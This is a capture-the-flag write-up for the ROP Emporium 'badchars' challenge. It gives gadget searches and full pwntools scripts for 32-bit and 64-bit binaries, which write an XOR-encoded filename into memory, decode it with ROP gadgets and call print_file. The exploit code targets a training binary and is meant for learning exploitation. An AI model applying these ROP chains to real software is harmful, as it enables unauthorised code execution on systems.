---
layout: post
title:  "ROP Emporium: badchars"
date:   2021-03-11 21:33:56 +0200
categories: ropemporium
---

## 32-bit ##
Executing the binary we get the following prompt:

```
voidwalker@Abyss:[badcharsx86]** ./badchars32
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> lol
Thank you!
```
It looks like we are going to have to make our payload so that it doesn't have these characters.
The equivalent in hexadecimal of these characters is ```0x78```, ```0x67```, ```0x61``` and ```0x2e``` respectively.

We are also given a hint on the website:
### You'll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we're going to overcome the badchars issue; could we use gadgets to change the string once it's in memory? Are the mutations the badchars undergo predictable or could we remove them from our string entirely so we know what will end up in memory then change them later? ###

This means that we should expect some possibility for encoding available in the given ROP gadgets. Other than the encoding part, however, the methodology is just the same as in the previous level.

Let's use ropper to look for gadgets that don't use the bad characters enumerated above and that would help us do some memory operations:
```
voidwalker@Abyss:[badcharsx86]** ropper --file badchars32 -b 007867612e --search "pop|mov"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop|mov

[INFO] File: badchars32
0x080484e7: mov al, byte ptr [0xc9010804]; ret;
0x0804846d: mov al, byte ptr [0xd0ff0804]; add esp, 0x10; leave; ret;
0x080484ba: mov al, byte ptr [0xd2ff0804]; add esp, 0x10; leave; ret;
0x080484e4: mov byte ptr [0x804a020], 1; leave; ret;
0x0804854f: mov dword ptr [edi], esi; ret;
0x080484b2: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a020; call edx;
0x08048466: mov ebp, esp; sub esp, 0x14; push 0x804a020; call eax;
0x080484da: mov ebp, esp; sub esp, 8; call 0x450; mov byte ptr [0x804a020], 1; leave; ret;
0x08048381: mov ebx, 0x81000000; ret;
0x08048423: mov ebx, dword ptr [esp]; ret;
0x0804847a: mov esp, 0x27; add bl, dh; ret;
0x08048525: pop ebp; lea esp, [ecx - 4]; ret;
0x080485bb: pop ebp; ret;
0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret;
0x0804839d: pop ebx; ret;
0x08048524: pop ecx; pop ebp; lea esp, [ecx - 4]; ret;
0x080485ba: pop edi; pop ebp; ret;
0x080485b9: pop esi; pop edi; pop ebp; ret;
0x08048527: popal; cld; ret;
```

Looks like we have the same available gadgets as before, which is great! However, there is still one problem:
```flag.txt``` contains the bad characters, which means we will have to encode it.

Since we are hinted towards a ```XOR``` encryption let's try and look for some ```xor```` gadgets:

```
voidwalker@Abyss:[badcharsx86]** ropper --file badchars32 -b 007867612e --search "xor"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] filtering badbytes... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: xor

[INFO] File: badchars32
0x08048713: xor byte ptr [ebp + 0xe], cl; and byte ptr [edi + 0xe], al; adc al, 0x41; ret;
0x08048547: xor byte ptr [ebp], bl; ret;
0x080485cf: xor ebx, dword ptr [edx]; add byte ptr [eax], al; add esp, 8; pop ebx; ret;
```

It looks like we are able to xor the value dereferenced by ```ebp``` with the value located in ```bl```. We could chain this with the ```pop ebp; ret``` gadgets found previously.
Let's get the address of the ```.data``` section as well, hopefully it doesn't have any bad characters.

```
voidwalker@Abyss:[badcharsx86]** readelf -S badchars32 | grep data
  [16] .rodata           PROGBITS        080485d8 0005d8 000014 00   A  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
```
It doesn't! Great!
Let's also get the ```PLT``` entry of the ```print_file()``` function, fingers crossed it doesn't have any bad characters!
```
voidwalker@Abyss:[badcharsx86]** readelf -r badchars32 | grep print
0804a014  00000407 R_386_JUMP_SLOT   00000000   print_file
```
Looks like it doesn't! We are good to go, now we only need to find a good value to xor our string with.

...

After some trial and error, as well as some research, I've come to the conclusion that it is best to xor the characters with ```33```.
Here is the final script:

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "i386"
context.bits = 32
context.endian = "little"
context.os = "linux"

xor_value = 33
data = 0x0804a018 # address of .data
print_file = p32(0x80483d0)
pops = p32(0x080485b8) # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
moves = p32(0x804854f) # mov DWORD PTR [edi],esi ; ret
xor = p32(0x08048547) # xor byte ptr [ebp], bl ; ret
popEbp = p32(0x080485bb) # pop ebp ; ret

e = ELF("./badchars32")

io = e.process()

print(io.recvuntil(">"))

payload = b"A" * 44
payload += pops
payload += p32(xor_value) # value to xor with
payload += p32(0x46404d47) # "flag" for edi
payload += p32(data) # for edi
payload += p32(data) # for ebp
payload += moves

payload += pops
payload += p32(xor_value) # value to xor with
payload += p32(0x5559550f) # ".txt" for edi
payload += p32(data + 4) # for edi
payload += p32(data) # for ebp
payload += moves

for i in range(8): # unxor the string
    payload += popEbp
    payload += p32(data + i)
    payload += xor

# return to print_file
payload += print_file
payload += popEbp
payload += p32(data)

with open("payload", "wb") as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```
And the flag:

```
voidwalker@Abyss:[badcharsx86]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/badcharsx86/badchars32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/badcharsx86/badchars32': pid 22003
b"badchars by ROP Emporium\nx86\n\nbadchars are: 'x', 'g', 'a', '.'\n>"
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

## 64-bit ##

Just like before, let's get our necessary addresses and let's make sure they do not have any bad characters:

```
voidwalker@Abyss:[badcharsx64]** readelf -S badchars | grep .data
  [15] .rodata           PROGBITS         00000000004006c0  000006c0
  [23] .data             PROGBITS         0000000000601028  00001028
voidwalker@Abyss:[badcharsx64]** readelf -r badchars | grep print_file
000000601020  000400000007 R_X86_64_JUMP_SLO 0000000000000000 print_file + 0
```

Good news! Looks like they don't! Except if we use the first 8 bytes of ```.data```. You can notice that the 7th byte of ```.data``` contains ```0x2e``` in its address, which is forbidden. Luckily, we can easily bypass this by starting to write after the 7th byte!
Alright, now let's find some suitable ROP gadgets:
```
voidwalker@Abyss:[badcharsx64]** ropper --file ./badchars --search "mov|pop|xor"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov|pop|xor

[INFO] File: ./badchars
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x0000000000400635: mov dword ptr [rbp], esp; ret;
0x0000000000400610: mov eax, 0; pop rbp; ret;
0x00000000004004dd: mov eax, dword ptr [rip + 0x200b15]; test rax, rax; je 0x4ea; call rax;
0x00000000004004dd: mov eax, dword ptr [rip + 0x200b15]; test rax, rax; je 0x4ea; call rax; add rsp, 8; ret;
0x0000000000400609: mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005db: mov ebp, esp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400619: mov ebp, esp; mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
0x000000000040061b: mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
0x000000000040057c: mov edi, 0x601038; jmp rax;
0x0000000000400634: mov qword ptr [r13], r12; ret;
0x00000000004004dc: mov rax, qword ptr [rip + 0x200b15]; test rax, rax; je 0x4ea; call rax;
0x00000000004004dc: mov rax, qword ptr [rip + 0x200b15]; test rax, rax; je 0x4ea; call rax; add rsp, 8; ret;
0x0000000000400608: mov rbp, rsp; call 0x500; mov eax, 0; pop rbp; ret;
0x00000000004005da: mov rbp, rsp; call 0x560; mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret;
0x0000000000400618: mov rbp, rsp; mov edi, 0x4006c4; call 0x510; nop; pop rbp; ret;
0x000000000040069c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040069e: pop r13; pop r14; pop r15; ret;
0x00000000004006a0: pop r14; pop r15; ret;
0x00000000004006a2: pop r15; ret;
0x000000000040057b: pop rbp; mov edi, 0x601038; jmp rax;
0x000000000040069b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040069f: pop rbp; pop r14; pop r15; ret;
0x0000000000400588: pop rbp; ret;
0x00000000004006a3: pop rdi; ret;
0x00000000004006a1: pop rsi; pop r15; ret;
0x000000000040069d: pop rsp; pop r13; pop r14; pop r15; ret;
0x0000000000400628: xor byte ptr [r15], r14b; ret;
0x0000000000400629: xor byte ptr [rdi], dh; ret;
```

After some time, we can successfully find the right ROP gadget chain, following the same methodology as before!
This is the final script:
```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.bits = 64
context.endian = "little"
context.os = "linux"

data_addr = 0x601028 + 7 # address of .data
print_file = p64(0x400510)
pops = p64(0x40069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
moves = p64(0x400634) # mov qword ptr [r13], r12 ; ret
xor = p64(0x400628) # xor byte ptr [r15], r14b ; ret
popR15 = p64(0x4006a2) # pop r15 ; ret
junk = p64(0xdeadbeefdeadc0de)
print_param = p64(0x4006a3) # pop rdi ; ret

e = ELF("./badchars")

io = e.process()

print(io.recvuntil(">"))

payload = b"A" * 40
payload += pops
payload += p64(0x5559550f46404d47) # "flag.txt" for edi
payload += p64(data_addr)
payload += p64(33) # value to xor with
payload += p64(data_addr)
payload += moves

for i in range(8): # unxor the string
    payload += popR15
    payload += p64(data_addr + i)
    payload += xor

# return to print_file
payload += print_param
payload += p64(data_addr)
payload += print_file

with open("payload", "wb") as file:
    file.write(payload)

io.sendline(payload)

print(io.recvrepeat())
```

Aaaaand noooww... get the flag!

```
voidwalker@Abyss:[badcharsx64]** ./exploit.py
[*] '/home/voidwalker/ROPEmporium/badcharsx64/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/home/voidwalker/ROPEmporium/badcharsx64/badchars': pid 24513
b"badchars by ROP Emporium\nx86_64\n\nbadchars are: 'x', 'g', 'a', '.'\n>"
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

Another challenge successfully solved!
